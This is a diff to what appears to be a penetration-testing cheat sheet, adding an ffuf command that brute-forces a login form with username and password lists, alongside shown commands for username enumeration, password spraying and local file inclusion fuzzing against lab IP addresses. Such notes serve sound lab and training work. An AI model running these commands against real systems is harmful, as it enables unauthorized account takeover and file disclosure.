@@ -28,6 +28,10 @@ ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&
 ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.115.135/customers/login -fc 200
 ```
 
+```
+ffuf -w usernames.txt:USER -w passwords.txt:PASS -H 'Content-Type: application/x-www-form-urlencoded' -u  http://10.10.84.8/login.php -d "username=USER&password=PASS" -fr "Please enter the correct credentials"
+```
+
 # Local file inclusion
 ```
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
